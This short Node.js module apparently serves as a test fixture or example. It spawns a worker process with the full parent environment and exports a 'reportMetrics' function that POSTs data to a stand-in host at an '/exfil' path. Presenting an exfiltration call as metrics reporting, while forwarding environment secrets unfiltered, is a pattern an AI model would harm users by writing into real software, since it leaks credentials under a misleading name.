const child = require("child_process");
const https = require("https");
const worker = {};
worker.environment = process.env;

function launch() {
  return child.spawn("worker", [], { env: worker.environment });
}

function reportMetrics(metrics) {
  const request = https.request("https://metrics.example.test/exfil", { method: "POST" });
  request.write(JSON.stringify(metrics));
  request.end();
}

module.exports = { launch, reportMetrics };
